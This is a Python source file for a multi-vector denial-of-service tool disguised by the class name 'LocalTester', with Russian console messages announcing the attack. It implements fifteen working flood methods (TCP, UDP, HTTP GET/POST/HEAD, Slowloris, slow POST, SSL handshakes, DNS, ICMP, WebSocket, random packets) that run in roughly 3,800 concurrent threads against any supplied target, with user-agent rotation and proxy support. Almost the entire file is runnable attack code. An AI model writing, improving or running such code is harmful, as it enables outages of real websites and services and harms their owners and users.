import requests
import threading
import time
import random
import json
import socket
import urllib3
import signal
import struct
import ssl
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class LocalTester:
    def __init__(self, target, use_user_agent=False, use_cookie=False, use_bypass=False, use_proxy=False):
        self.target = self.normalize_target(target)
        self.use_user_agent = use_user_agent
        self.use_cookie = use_cookie
        self.use_bypass = use_bypass
        self.use_proxy = use_proxy
        self.success_count = 0
        self.error_count = 0
        self.running = False
        self.user_agents = []
        self.proxies = []
        self.cookies = {}
        self.protection_methods = []
        self.lock = threading.Lock()
        self.host, self.port = self.parse_target(self.target)
        
        self.load_resources()
        self.detect_protections()
        
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, signum, frame):
        print("\n\nОстанавливаю атаку...")
        self.running = False

    def parse_target(self, target):
        if target.startswith('http://'):
            target = target[7:]
        elif target.startswith('https://'):
            target = target[8:]
        
        if ':' in target:
            host, port = target.split(':', 1)
            port = int(port.split('/')[0])
        else:
            host = target.split('/')[0]
            port = 80
        
        return host, port

    def normalize_target(self, target):
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        return target

    def load_resources(self):
        try:
            with open('user.json', 'r') as f:
                data = json.load(f)
                self.user_agents = [item.get('user_agent', '') for item in data if item.get('user_agent')]
        except:
            self.user_agents = ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'] * 100

        try:
            with open('proxy.json', 'r') as f:
                self.proxies = json.load(f)
        except:
            self.proxies = []

    def detect_protections(self):
        return

    def generate_cookies(self):
        if self.use_cookie:
            return {'session': str(random.randint(100000, 999999))}
        return {}

    def get_random_user_agent(self):
        if self.use_user_agent and self.user_agents:
            return random.choice(self.user_agents)
        return 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'

    def get_random_proxy(self):
        if self.use_proxy and self.proxies:
            proxy = random.choice(self.proxies)
            return {
                'http': f"http://{proxy['ip']}:{proxy['port']}",
                'https': f"http://{proxy['ip']}:{proxy['port']}"
            }
        return None

    def tcp_syn_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect((self.host, self.port))
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def tcp_ack_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect((self.host, self.port))
                payload = struct.pack('!HHII', 0, 0, 0, 0)
                sock.send(payload)
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def udp_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(1400)
                for _ in range(500):
                    if not self.running:
                        break
                    sock.sendto(data, (self.host, self.port))
                    with self.lock:
                        self.success_count += 1
                sock.close()
            except:
                with self.lock:
                    self.error_count += 1

    def udp_amplification(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(512)
                for _ in range(1000):
                    if not self.running:
                        break
                    sock.sendto(data, (self.host, self.port))
                    with self.lock:
                        self.success_count += 1
                sock.close()
            except:
                with self.lock:
                    self.error_count += 1

    def http_get_flood(self):
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=1000, pool_maxsize=1000)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        while self.running:
            try:
                headers = {'User-Agent': self.get_random_user_agent()}
                for _ in range(200):
                    if not self.running:
                        break
                    try:
                        response = session.get(self.target, headers=headers, timeout=0.1, verify=False)
                        with self.lock:
                            self.success_count += 1
                    except:
                        with self.lock:
                            self.error_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def http_post_flood(self):
        session = requests.Session()
        while self.running:
            try:
                headers = {'User-Agent': self.get_random_user_agent(), 'Content-Type': 'application/x-www-form-urlencoded'}
                data = {'data': random._urandom(10000)}
                for _ in range(100):
                    if not self.running:
                        break
                    try:
                        response = session.post(self.target, headers=headers, data=data, timeout=0.1, verify=False)
                        with self.lock:
                            self.success_count += 1
                    except:
                        with self.lock:
                            self.error_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def http_head_flood(self):
        session = requests.Session()
        while self.running:
            try:
                headers = {'User-Agent': self.get_random_user_agent()}
                for _ in range(300):
                    if not self.running:
                        break
                    try:
                        response = session.head(self.target, headers=headers, timeout=0.1, verify=False)
                        with self.lock:
                            self.success_count += 1
                    except:
                        with self.lock:
                            self.error_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def slowloris_attack(self):
        sockets_pool = []
        while self.running:
            try:
                while len(sockets_pool) < 500 and self.running:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(10)
                        sock.connect((self.host, self.port))
                        http_request = f"GET / HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {self.get_random_user_agent()}\r\n"
                        sock.send(http_request.encode())
                        sockets_pool.append(sock)
                        with self.lock:
                            self.success_count += 1
                    except:
                        break
                
                for sock in sockets_pool[:]:
                    try:
                        sock.send("X-a: b\r\n".encode())
                    except:
                        sockets_pool.remove(sock)
                        with self.lock:
                            self.error_count += 1
                
                time.sleep(10)
            except:
                pass

    def slow_post_attack(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((self.host, self.port))
                post_request = f"POST / HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {self.get_random_user_agent()}\r\nContent-Length: 1000000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n"
                sock.send(post_request.encode())
                
                start_time = time.time()
                while self.running and time.time() - start_time < 30:
                    try:
                        sock.send(b"A" * 1000)
                        time.sleep(1)
                    except:
                        break
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def ssl_exhaustion(self):
        while self.running:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                ssl_sock = context.wrap_socket(sock, server_hostname=self.host)
                ssl_sock.connect((self.host, self.port))
                ssl_sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def dns_amplification(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                dns_query = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x02\x61\x62\x03\x63\x6f\x6d\x00\x00\x01\x00\x01'
                for _ in range(500):
                    if not self.running:
                        break
                    sock.sendto(dns_query, (self.host, self.port))
                    with self.lock:
                        self.success_count += 1
                sock.close()
            except:
                with self.lock:
                    self.error_count += 1

    def icmp_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                packet = struct.pack('!BBHHH', 8, 0, 0, 0, 0)
                for _ in range(200):
                    if not self.running:
                        break
                    sock.sendto(packet, (self.host, 0))
                    with self.lock:
                        self.success_count += 1
                sock.close()
            except:
                with self.lock:
                    self.error_count += 1

    def http2_flood(self):
        session = requests.Session()
        while self.running:
            try:
                headers = {'User-Agent': self.get_random_user_agent(), 'Accept-Encoding': 'gzip, deflate, br'}
                for _ in range(400):
                    if not self.running:
                        break
                    try:
                        response = session.get(self.target, headers=headers, timeout=0.1, verify=False)
                        with self.lock:
                            self.success_count += 1
                    except:
                        with self.lock:
                            self.error_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def websocket_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.host, self.port))
                ws_handshake = f"GET / HTTP/1.1\r\nHost: {self.host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n"
                sock.send(ws_handshake.encode())
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def random_packet_flood(self):
        while self.running:
            try:
                proto = random.choice([socket.SOCK_STREAM, socket.SOCK_DGRAM])
                sock = socket.socket(socket.AF_INET, proto)
                sock.settimeout(0.01)
                
                if proto == socket.SOCK_STREAM:
                    sock.connect((self.host, self.port))
                    sock.send(random._urandom(1024))
                else:
                    sock.sendto(random._urandom(1024), (self.host, self.port))
                
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def status_worker(self):
        last_success, last_error, start_time = 0, 0, time.time()
        peak_rps = 0
        
        while self.running:
            current_time = time.time()
            elapsed_time = current_time - start_time
            
            current_success, current_error = self.success_count, self.error_count
            success_rate, error_rate = current_success - last_success, current_error - last_error
            
            total_requests = success_rate + error_rate
            current_rps = total_requests / 0.1
            peak_rps = max(peak_rps, current_rps)
            
            if total_requests > 0:
                success_percent = (success_rate / total_requests) * 100
            else:
                success_percent = 0
                
            status = "ХОРОШЕЕ" if success_percent >= 80 else "НОРМАЛЬНОЕ" if success_percent >= 50 else "ПЛОХОЕ" if success_percent >= 20 else "ОТКАЗ"
            
            print(f"\rУспешно: {self.success_count:,} | Ошибки: {self.error_count:,} | Статус: {status} | RPS: {current_rps:,.0f} | Пик: {peak_rps:,.0f}", end="", flush=True)
            
            last_success, last_error = current_success, current_error
            time.sleep(0.1)

    def start_attack(self):
        print("\033[91mАтака началась...\033[0m")
        print("\033[96mКомбинированная атака: TCP + UDP + HTTP + MEMORY + SLOWLORIS MASSIVE + RAW PACKETS\033[0m")
        
        self.running = True
        attack_start_time = time.time()
        
        status_thread = threading.Thread(target=self.status_worker)
        status_thread.daemon = True
        status_thread.start()
        
        threads = []
        
        attack_methods = [
            self.tcp_syn_flood, self.tcp_ack_flood, self.udp_flood, self.udp_amplification,
            self.http_get_flood, self.http_post_flood, self.http_head_flood, self.http2_flood,
            self.slowloris_attack, self.slow_post_attack, self.ssl_exhaustion, self.dns_amplification,
            self.icmp_flood, self.websocket_flood, self.random_packet_flood
        ]
        
        thread_counts = [200, 200, 300, 300, 400, 400, 300, 300, 100, 100, 200, 200, 150, 150, 500]
        
        for i, method in enumerate(attack_methods):
            for _ in range(thread_counts[i]):
                thread = threading.Thread(target=method)
                thread.daemon = True
                threads.append(thread)
        
        print(f"Создано {len(threads)} потоков, запускаю...")
        
        batch_size = 500
        for i in range(0, len(threads), batch_size):
            batch = threads[i:i + batch_size]
            for thread in batch:
                thread.start()
            time.sleep(0.01)
        
        print(f"Все {len(threads)} потоков запущены!")
        
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
        
        attack_duration = time.time() - attack_start_time
        total_requests = self.success_count + self.error_count
        avg_rps = total_requests / attack_duration
        
        print("\n\nАтака остановлена!")
        print(f"Итоговая статистика:")
        print(f"   Успешных запросов: {self.success_count:,}")
        print(f"   Ошибок: {self.error_count:,}")
        print(f"   Всего запросов: {total_requests:,}")
        print(f"   Время атаки: {attack_duration:.1f}с")
        print(f"   Средний RPS: {avg_rps:,.0f}")

def test_local(target, use_user_agent=False, use_cookie=False, use_bypass=False, use_proxy=False):
    tester = LocalTester(target, use_user_agent, use_cookie, use_bypass, use_proxy)
    tester.start_attack()